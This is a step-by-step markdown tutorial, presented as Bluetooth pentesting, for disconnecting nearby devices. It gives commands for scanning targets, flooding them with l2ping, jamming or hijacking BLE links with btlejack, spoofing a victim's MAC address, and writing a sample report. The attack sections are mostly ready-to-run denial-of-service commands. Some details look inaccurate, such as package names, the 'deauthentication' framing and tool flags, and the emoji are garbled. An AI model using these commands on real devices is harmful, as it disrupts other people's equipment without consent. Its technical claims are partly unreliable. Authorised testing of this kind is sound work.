## **‚ö†Ô∏è LEGAL DISCLAIMER**  
Performing Bluetooth deauthentication attacks on unauthorized networks or devices **without proper authorization** is illegal and violates laws like the **Computer Fraud and Abuse Act (CFAA)** and **Telecom Acts**. Ensure you have explicit **written permission** before proceeding with any security assessments.

---

## **1. Install Required Tools**
Before starting, update your system and install Bluetooth hacking tools:

```bash
sudo apt update && sudo apt install bluez bluez-tools rfkill l2ping hciconfig hcitool git
```

Clone a Bluetooth pentesting suite:
```bash
git clone https://github.com/virtualabs/btlejack.git
cd btlejack
pip3 install -r requirements.txt
```

Enable your Bluetooth interface:
```bash
sudo rfkill unblock bluetooth
sudo systemctl start bluetooth
```

Check if your Bluetooth adapter is detected:
```bash
hciconfig
```

---

## **2. Scan for Nearby Bluetooth Devices**
You need to first identify all **active** Bluetooth devices in range.

### **üîç Scan for Classic Bluetooth Devices (BT 2.0)**
```bash
hcitool scan
```
This will return a list of devices with their MAC addresses.

To scan **actively connected** Bluetooth devices:
```bash
hcitool con
```

### **üîç Scan for BLE (Bluetooth Low Energy) Devices**
If you are targeting Bluetooth Low Energy (BLE) devices:
```bash
sudo hcitool lescan
```

---

## **3. Identify and Target a Device**
Once you have the target's MAC address, you can gather more information:

Get the device name:
```bash
hcitool name <MAC>
```

Check device signal strength (RSSI):
```bash
hcitool rssi <MAC>
```

Query device capabilities:
```bash
sdptool browse <MAC>
```

---

## **4. Bluetooth Deauthentication Techniques**
### **üìå Method 1: Send Continuous L2CAP Ping (Soft DoS)**
This method floods the target with L2CAP connection requests, causing **temporary disconnection**.

```bash
l2ping -i hci0 -s 600 -f <MAC>
```
- `-i hci0` ‚Üí Use interface `hci0`
- `-s 600` ‚Üí Send 600-byte ping packets
- `-f` ‚Üí Flood mode (continuous attack)

‚ö†Ô∏è This will slow down or **temporarily disconnect** the target.

---

### **üìå Method 2: Use "Bluetooth Jack" (BLE Jamming)**
For BLE devices, you can use **btlejack** to jam and take over connections.

Start jamming:
```bash
btlejack -j
```
Or specify a target BLE MAC:
```bash
btlejack -t <BLE_MAC>
```

This will disrupt the BLE connection, forcing a **deauthentication-like effect**.

---

### **üìå Method 3: Bluetooth Spoofing (Disconnect Forcefully)**
You can impersonate the target device and force a re-connection (disconnecting it from its current link).

1. Change your MAC address to the victim's:
```bash
sudo bdaddr -i hci0 <TARGET_MAC>
```
2. Restart Bluetooth services:
```bash
sudo systemctl restart bluetooth
```

‚ö†Ô∏è This **only works on devices with weak pairing mechanisms**.

---

## **5. Generate a Pentest Report**
Once you've performed the attack, document your findings in a structured report.

### **üìù Sample Report Structure**
```
# Bluetooth Pentesting Report

## 1. Overview
- **Assessment Date:** [DATE]
- **Tester:** [YOUR NAME]
- **Scope:** Bluetooth devices within [RANGE]
- **Goal:** Identify and deauthenticate certain Bluetooth clients

## 2. Target Discovery
| Device Name | MAC Address | RSSI | Type |
|-------------|------------|------|------|
| Speaker XYZ | 00:1A:7D:DA:71:13 | -50dBm | Classic |
| Smartwatch | 48:59:29:30:23:45 | -60dBm | BLE |

## 3. Attack Execution
### üìå **Method: L2CAP Flooding**
- Target: **00:1A:7D:DA:71:13**
- Command Used: `l2ping -i hci0 -s 600 -f 00:1A:7D:DA:71:13`
- Result: Device **disconnected temporarily** (confirmed via `hcitool con`)

### üìå **Method: BLE Jamming**
- Target: **48:59:29:30:23:45**
- Command Used: `btlejack -t 48:59:29:30:23:45`
- Result: BLE communication **disrupted**

## 4. Conclusion
- **Security Impact:** Devices are vulnerable to denial-of-service attacks.
- **Recommendations:** Implement stronger pairing authentication and MAC address randomization.

```

---

## **Final Notes**
- **Bluetooth attacks are short-range (~10m) unless using a high-gain antenna.**
- **Some attacks might not work on newer devices with enhanced security (Bluetooth 5+).**
- **Always ensure you have legal authorization before testing.**
